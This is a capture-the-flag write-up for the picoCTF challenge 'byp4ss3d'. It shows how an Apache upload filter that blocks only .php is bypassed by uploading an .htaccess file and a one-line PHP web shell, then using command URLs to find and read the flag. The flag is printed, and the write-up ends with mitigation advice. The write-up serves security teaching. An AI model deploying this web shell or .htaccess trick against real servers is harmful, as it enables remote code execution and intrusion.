# PicoCTF – byp4ss3d
**Category:** Web Exploitation  
**Difficulty:** Medium  
**Points:** 300  
**Author:** Yahaya Meddy  
**Flag:** `picoCTF{s3rv3r_byp4ss_9e7008ba}`

---

## Description

> A university's online registration portal asks students to upload their ID cards for verification. The developer put some filters in place to ensure only image files are uploaded but are they enough?

---

## Hints

1. Apache can be tricked into executing non-PHP files as PHP with a `.htaccess` file.
2. Try uploading more than just one file.

---

## Recon

### Step 1 – Normal Upload

Uploaded a legitimate PNG — succeeded. File served at `/images/filename.png`.

### Step 2 – Test Filter

- `.php` → blocked ("not allowed")
- `.php5`, `.phtml`, `.phar` → uploaded but served as plain text (not executed)
- Server: `Apache/2.4.62 (Debian)`

The filter only blocks `.php` extension. Other PHP-compatible extensions upload but Apache isn't configured to execute them by default.

---

## Exploitation

### Step 3 – .htaccess Upload

Apache reads `.htaccess` files to configure directory-level behavior. Uploading a custom `.htaccess` to `/images/` can force Apache to treat any extension as PHP.

Created `.htaccess`:
```
AddType application/x-httpd-php .pwn
```

Uploaded successfully to `/images/.htaccess`.

### Step 4 – Upload Webshell

Created `shell.pwn`:
```php
<?php system($_GET['cmd']); ?>
```

Uploaded successfully to `/images/shell.pwn`.

### Step 5 – Remote Code Execution

Visited:
```
http://amiable-citadel.picoctf.net:53925/images/shell.pwn?cmd=ls+/
```

Apache now executes `.pwn` as PHP — RCE confirmed!

### Step 6 – Find the Flag

```
http://.../shell.pwn?cmd=find+/var/www+-type+f
```

Output:
```
/var/www/html/images/.htaccess
/var/www/html/images/shell.pwn
/var/www/html/index.php
/var/www/html/upload.php
/var/www/flag.txt   ← here!
```

```
http://.../shell.pwn?cmd=cat+/var/www/flag.txt
```

---

## Flag

```
picoCTF{s3rv3r_byp4ss_9e7008ba}
```

---

## Key Takeaways

- **File upload bypass** — blocking only `.php` is insufficient; dozens of PHP-compatible extensions exist
- **`.htaccess` abuse** — if users can upload to a directory, they can control Apache config for that directory
- Mitigations:
  - Block upload of `.htaccess` files explicitly
  - Store uploads outside the web root
  - Use a whitelist of allowed MIME types validated server-side, not just by extension
  - Rename uploaded files to random strings with safe extensions
